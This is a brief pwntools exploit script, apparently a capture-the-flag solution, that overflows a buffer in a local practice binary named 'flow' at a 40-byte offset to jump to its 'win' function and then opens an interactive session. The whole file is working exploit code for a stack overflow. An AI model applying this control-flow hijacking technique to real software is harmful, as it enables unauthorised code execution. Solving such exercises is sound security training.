from pwn import *

elf = ELF('flow')
p = elf.process()
offset = 40
payload = flat({offset: p64(elf.symbols.win)})
p.sendline(payload)
p.interactive()
